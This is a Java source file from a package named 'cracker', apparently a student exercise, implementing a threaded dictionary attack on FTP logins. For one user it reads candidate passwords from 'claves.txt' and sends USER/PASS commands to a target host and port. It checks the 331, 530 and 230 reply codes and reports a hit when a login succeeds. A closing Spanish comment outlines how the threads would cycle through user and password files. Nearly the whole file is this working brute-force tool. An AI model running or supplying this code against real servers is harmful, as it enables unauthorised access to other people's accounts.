package cracker;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author dam2
 */
public class Escribir extends Thread {

    Socket socket;
    LinkedList<String> mensajes;
    String usuario;
    String pass;
    boolean cierre = false;
    String mensaje = "";
    String Host = "";
    int Puerto = 0;
    int id = 0;

    Escribir() {

    }

    Escribir(String host, int port, LinkedList<String> mensajes, String usuario) {
        this.socket = socket;
        this.mensajes = mensajes;
        this.usuario = usuario;
        //this.pass = pass;
        this.Host = host;
        this.Puerto = port;
    }

    public void run() {
        Socket socket;
        System.out.println(usuario + "usuario***");
        try {
            socket = new Socket(Host, Puerto);
            Leer leer = new Leer(socket, mensajes);
            leer.start();
            sleep(100);
            String respuesta = "";

            Scanner scContra = new Scanner(new File("claves.txt"));
            while (scContra.hasNext()) {
                pass = scContra.nextLine();
                   System.out.println("contraseña primera " + pass +" " + usuario );
                while (mensajes.size() > 0) {
                    respuesta = mensajes.pop();
                    System.out.println(respuesta + " " + usuario);
                }
                PrintWriter escribir = new PrintWriter(socket.getOutputStream());
                
                if (mensajes.size() <= 0) {
                    escribir.println("user " + usuario);
                   
                    escribir.flush();


                    while (mensajes.isEmpty()) {
                        Thread.sleep(10);
                    }

                    mensaje = mensajes.pop();
                    if (mensaje.contains("331")) {
                        //System.out.println("entro en 331 " + usuario + " " + pass);
                        escribir.println("pass " + pass);
                        escribir.flush();

                    }

                    while (mensajes.isEmpty()) {
                        Thread.sleep(50);
                    }

                    mensaje = mensajes.pop();
                    System.out.println("prueba " + id + " " + mensaje);
                    if (mensaje.contains("530")) {
                        
                        //socket.close();

                    } else if (mensaje.contains("230")) {
                        System.out.println("Has acertado");
                        cierre = true;
                        socket.close();
                    }
                }

                id++;
            }

        } catch (Exception e) {

        }
    }
}

/*
Clase iniciador recibe la LOCALHOST Y PUERTO e Hilos
 esta clase lee el archivo usuario linea a linea, cada vez que lee una linea crea un hilo que es la clase crackear
eso lo hara en un bucle siendo los hilos que ha puesto (todo esto dentro de un bucle while que termina cuando termina los usuarios)

Clase CRAcKEAR recibe el usuario, Localhost y Puerto con Hilo Thread
 lee el archivo de contraseña todas las lineas una a una, por cada linea genera un hilo leer y un hilo escribir
bucle que espera a que muera un hilo para generar el otro 

Clase Escribir con hilo Thread

Clse LEER con hilo Thread


*/